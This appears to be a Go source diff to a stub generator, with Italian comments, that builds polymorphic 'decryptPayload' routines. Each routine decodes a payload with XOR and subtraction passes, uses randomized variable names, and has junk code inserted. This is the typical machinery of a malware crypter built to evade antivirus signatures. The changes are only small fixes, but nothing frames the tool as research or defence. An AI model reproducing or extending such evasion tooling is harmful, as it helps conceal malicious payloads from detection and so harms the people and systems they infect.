@@ -26,7 +26,7 @@ type StubTemplateGenerator struct {
 // NewStubTemplateGenerator crea un nuovo generator
 func NewStubTemplateGenerator() *StubTemplateGenerator {
 	seedBytes := make([]byte, 8)
-	rand.Read(seedBytes)
+	_, _ = rand.Read(seedBytes)
 	seed := time.Now().UnixNano()
 
 	return &StubTemplateGenerator{
@@ -239,21 +239,21 @@ func (stg *StubTemplateGenerator) generateMultiPass(vars map[string]string) stri
 	garbage := stg.generateGarbageCode()
 
 	template := `
-// Variant: Multi-Pass Decryption
-func decryptPayload_%[1]s({{DATA}} []byte, {{KEY}} byte) {
-	%[2]s
-	// First pass: XOR
-	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
-		{{DATA}}[{{I}}] ^= {{KEY}}
+	// Variant: Multi-Pass Decryption
+	func decryptPayload_%[1]s({{DATA}} []byte, {{KEY}} byte) {
+		%[2]s
+		// First pass: XOR
+		for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
+			{{DATA}}[{{I}}] ^= {{KEY}}
+		}
+		%[3]s
+		// Second pass: ADD
+		{{OFFSET}} := byte({{KEY}} * 3)
+		for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
+			{{DATA}}[{{I}}] = byte((int({{DATA}}[{{I}}]) - int({{OFFSET}})) %% 256)
+		}
 	}
-	%[3]s
-	// Second pass: ADD
-	{{OFFSET}} := byte({{KEY}} * 3)
-	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
-		{{DATA}}[{{I}} ] = ({{DATA}}[{{I}}] - {{OFFSET}}) %% 256
-	}
-}
-`
+	`
 
 	code := fmt.Sprintf(template,
 		stg.generateRandomString(8),
